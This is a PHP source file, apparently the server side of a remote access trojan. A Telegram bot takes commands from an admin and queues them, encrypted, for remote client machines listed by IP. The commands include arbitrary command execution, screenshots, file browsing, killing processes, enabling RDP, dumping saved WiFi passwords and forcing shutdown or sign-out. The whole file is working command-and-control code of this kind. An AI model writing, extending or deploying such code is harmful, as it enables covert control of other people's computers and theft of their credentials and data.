<?php

namespace Handlers;

use Services\LoggerService;
use Services\TelegramService;
use Services\ClientService;
use Services\EncryptionService;
use PDO;

class WebhookHandler
{
    private $pdo;
    private $logger;
    private $telegram;
    private $clientService;
    private $encryption;

    public function __construct(PDO $pdo)
    {
        $this->pdo = $pdo;
        $this->logger = new LoggerService();
        $this->telegram = new TelegramService($this->logger);
        $this->clientService = new ClientService($pdo, $this->logger);
        $this->encryption = new EncryptionService($this->logger);
    }

    public function handle(array $update)
    {
        if (!$update) {
            http_response_code(400);
            $this->logger->logError("Invalid webhook request");
            die("Invalid request");
        }

        $this->logger->logWebhook(json_encode($update));

        // پردازش callback_query
        if (isset($update['callback_query'])) {
            $this->logger->logWebhook("Callback query detected, processing...");
            $callbackHandler = new CallbackQueryHandler($this->pdo, $this->logger, $this->telegram, $this->clientService);
            $callbackHandler->handle($update['callback_query']);
        }
        // پردازش message
        elseif (isset($update['message'])) {
            $this->logger->logWebhook("Message detected, processing...");
            $this->processMessage($update['message']);
        }
        // سایر انواع update
        else {
            $this->logger->logWebhook("Unknown update type: " . json_encode(array_keys($update)));
        }

        http_response_code(200);
    }

    private function processMessage(array $message)
    {
        $chatId = $message['chat']['id'] ?? null;
        $text = $message['text'] ?? '';
        $userId = $message['from']['id'] ?? null;

        $this->logger->logWebhook("Processing message: user_id=$userId, chat_id=$chatId, text=$text");

        if (!$this->clientService->isUserAuthorized($userId)) {
            $this->telegram->sendPlainMessage($chatId, "Unauthorized access. Only the admin can issue commands.");
            $this->logger->logError("Unauthorized access attempt by user_id: $userId");
            return;
        }

        // Handle /select command
        if (preg_match('/^\/select\s+(.+)$/', $text, $matches)) {
            $clientId = trim($matches[1]);
            if ($this->clientService->clientExists($clientId)) {
                $this->clientService->setSelectedClient($userId, $clientId);
                $this->sendCommandKeyboard($chatId, "Selected client: $clientId\nChoose a command:");
                $this->logger->logWebhook("Client selected via /select: $clientId");
            } else {
                $this->telegram->sendPlainMessage($chatId, "Client ID '$clientId' not found. Use /start to see available clients.");
                $this->logger->logError("Invalid client_id in /select: $clientId");
            }
            return;
        }

        // Handle /start command
        if (preg_match('/^\/start$/', $text)) {
            $this->sendClientKeyboard($chatId);
            return;
        }

        // Handle /go command
        if (preg_match('/^\/go\s+(.+)$/', $text, $matches)) {
            $url = trim($matches[1]);
            $selectedClient = $this->clientService->getSelectedClient($userId);
            if ($selectedClient) {
                $this->processCommand('open_url', ['url' => $url], $selectedClient, $chatId);
                $this->logger->logWebhook("Open URL command queued: $url");
            } else {
                $this->telegram->sendPlainMessage($chatId, "No client selected. Use /start or /select <client_id>.");
            }
            return;
        }

        // Handle other commands
        $selectedClient = $this->clientService->getSelectedClient($userId);
        if ($selectedClient) {
            $commandType = $this->parseCommandType($text);
            $params = $this->parseCommandParams($text);

            if ($commandType) {
                $this->processCommand($commandType, $params, $selectedClient, $chatId);
                $this->logger->logWebhook("Command queued: $commandType");
            } else {
                $this->telegram->sendPlainMessage($chatId, "Unknown command. Use /start to see available commands.");
            }
        } else {
            $this->telegram->sendPlainMessage($chatId, "No client selected. Use /start or /select <client_id>.");
        }
    }

    // در تابع parseCommandType، بخش commandMap را آپدیت کنید:
    private function parseCommandType(string $text): ?string
    {
        $commandMap = [
            '/status' => 'status',
            '/screenshot' => 'capture_screenshot',
            '/exec' => 'system_command',
            '/shutdown' => 'system_command',
            '/restart' => 'system_command',
            '/sleep' => 'system_command',
            '/signout' => 'system_command',
            '/browse' => 'file_operation',
            '/get-info' => 'system_info',          // ✅ اضافه شد
            '/tasks' => 'process_management',      // ✅ اضافه شد
            '/end_task' => 'end_task',             // ✅ اضافه شد
            '/enable_rdp' => 'enable_rdp',         // ✅ اضافه شد
            '/disable_rdp' => 'disable_rdp',       // ✅ اضافه شد
            '/getwifipasswords' => 'get_wifi_passwords', // ✅ اضافه شد
        ];

        foreach ($commandMap as $cmd => $type) {
            if (str_starts_with($text, $cmd)) {
                return $type;
            }
        }

        return null;
    }

    private function parseCommandParams(string $text): array
    {
        $params = [];

        // دستور /exec - اجرای دستور سیستم
        if (preg_match('/^\/exec\s+(.+)$/', $text, $matches)) {
            $params['command'] = trim($matches[1]);
            return $params;
        }

        // دستور /browse - مرور فایل‌ها
        if (preg_match('/^\/browse\s+(.+)$/', $text, $matches)) {
            $params['action'] = 'list';
            $params['path'] = trim($matches[1]);
            return $params;
        }

        // دستور /end_task - پایان دادن به تسک
        if (preg_match('/^\/end_task\s+(.+)$/', $text, $matches)) {
            $params['process_name'] = trim($matches[1]);
            return $params;
        }

        // دستور /go - باز کردن URL
        if (preg_match('/^\/go\s+(.+)$/', $text, $matches)) {
            $params['url'] = trim($matches[1]);
            return $params;
        }

        // دستور /tasks - لیست فرآیندها
        if (str_starts_with($text, '/tasks')) {
            $params['action'] = 'list';
        }

        // دستور /get-info - اطلاعات سیستم
        if (str_starts_with($text, '/get-info')) {
            $params['action'] = 'full';
        }

        // دستور /getwifipasswords - دریافت پسوردهای WiFi
        if (str_starts_with($text, '/getwifipasswords')) {
            $params['action'] = 'all';
        }

        // دستور /enable_rdp - فعال‌سازی RDP
        if (str_starts_with($text, '/enable_rdp')) {
            $params['action'] = 'enable';
        }

        // دستور /disable_rdp - غیرفعال‌سازی RDP
        if (str_starts_with($text, '/disable_rdp')) {
            $params['action'] = 'disable';
        }

        // دستورات مدیریت سیستم
        if (str_starts_with($text, '/shutdown')) {
            $params['command'] = 'shutdown';
        } elseif (str_starts_with($text, '/restart')) {
            $params['command'] = 'restart';
        } elseif (str_starts_with($text, '/sleep')) {
            $params['command'] = 'sleep';
        } elseif (str_starts_with($text, '/signout')) {
            $params['command'] = 'signout';
        }

        // دستور /status - وضعیت سیستم
        if (str_starts_with($text, '/status')) {
            $params['action'] = 'check';
        }

        // دستور /screenshot - گرفتن عکس از صفحه
        if (str_starts_with($text, '/screenshot')) {
            $params['action'] = 'capture';
        }

        return $params;
    }

    private function processCommand(string $commandType, array $params, string $clientId, string $chatId): array
    {
        try {
            $commandData = [
                'type' => $commandType,
                'params' => $params
            ];

            $encryptedCommand = $this->encryption->encrypt(json_encode($commandData));

            $stmt = $this->pdo->prepare(
                "INSERT INTO client_commands (client_id, command, status, created_at) 
                VALUES (?, ?, 'pending', NOW())"
            );
            $stmt->execute([$clientId, $encryptedCommand]);

            $this->telegram->sendPlainMessage($chatId, "✅ Command '$commandType' queued for client $clientId.");
            $this->logger->logWebhook("Command queued: $commandType for client: $clientId");

            return ['status' => 'success'];
        } catch (\PDOException $e) {
            $this->logger->logError("Failed to queue command: " . $e->getMessage());
            $this->telegram->sendPlainMessage($chatId, "❌ Error: Failed to queue command.");
            return ['error' => 'Failed to queue command'];
        }
    }

    private function sendClientKeyboard(string $chatId)
    {
        $clients = $this->getClientStatus();

        if (empty($clients)) {
            $this->telegram->sendPlainMessage($chatId, "No clients registered.\n\nPlease ensure clients are connected.\nUse /select <client_id> to select directly.");
            $this->logger->logError("No clients found for keyboard");
            return;
        }

        $keyboard = ['inline_keyboard' => []];
        $row = [];

        foreach ($clients as $client) {
            $status = $client['is_online'] ? '🟢' : '🔴';
            $ip = $client['ip_address'] ?? 'Unknown';
            $clientId = $client['client_id'];

            // ساده‌سازی متن دکمه برای جلوگیری از خطای parse
            $buttonText = "$status $clientId ($ip)";

            $row[] = [
                'text' => $buttonText,
                'callback_data' => "select_client:$clientId"
            ];

            if (count($row) == 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }

        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        $this->logger->logWebhook("Sending client keyboard with " . count($clients) . " clients");
        $this->telegram->sendPlainMessage($chatId, "Select a client:", ['reply_markup' => $keyboard]);
    }

    private function sendCommandKeyboard(string $chatId, string $message)
    {
        $commands = [
            '/status' => '📊 Status',
            '/screenshot' => '📸 Screenshot',
            '/exec' => '⚙️ Execute',
            '/browse' => '📁 Browse',
            '/get-info' => 'ℹ️ Info',
            '/go' => '🌐 Open URL',
            '/shutdown' => '🔴 Shutdown',
            '/restart' => '🔄 Restart',
            '/sleep' => '😴 Sleep',
            '/signout' => '🚪 Sign Out',
            '/tasks' => '📋 Tasks',
            '/end_task' => '❌ End Task',
            '/enable_rdp' => '🖥️ Enable RDP',
            '/disable_rdp' => '🚫 Disable RDP',
            '/getwifipasswords' => '📡 WiFi',
            '/select' => '🔙 Select Client'
        ];

        $keyboard = ['inline_keyboard' => []];
        $row = [];

        foreach ($commands as $cmd => $label) {
            $row[] = [
                'text' => $label,
                'callback_data' => "command:$cmd"
            ];

            if (count($row) == 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }

        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        $this->telegram->sendPlainMessage($chatId, $message, ['reply_markup' => $keyboard]);
    }

    private function getClientStatus(): array
    {
        try {
            $onlineThreshold = date('Y-m-d H:i:s', time() - \Config::$ONLINE_THRESHOLD);

            $stmt = $this->pdo->prepare(
                "SELECT client_id, ip_address, 
                IF(last_seen > ?, 1, 0) as is_online,
                last_seen
                FROM clients
                ORDER BY is_online DESC, last_seen DESC"
            );
            $stmt->execute([$onlineThreshold]);
            $clients = $stmt->fetchAll();

            $this->logger->logWebhook("Found " . count($clients) . " clients");
            return $clients;
        } catch (\PDOException $e) {
            $this->logger->logError("Failed to fetch client status: " . $e->getMessage());
            return [];
        }
    }
}
